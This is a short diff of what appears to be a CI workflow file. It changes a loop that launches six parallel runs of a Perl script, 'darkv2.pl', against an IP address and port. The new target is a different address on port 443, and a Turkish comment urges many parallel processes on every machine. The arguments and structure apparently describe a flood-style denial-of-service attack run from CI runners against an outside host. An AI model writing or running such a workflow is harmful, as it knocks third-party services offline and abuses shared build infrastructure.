@@ -23,7 +23,7 @@ jobs:
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl darkv2.pl 171.22.18.114 30033 10000 65600 R 1 &
+            perl darkv2.pl 204.76.203.30 443 10000 65600 R 1 &
             PIDS+=($!)
           done
           
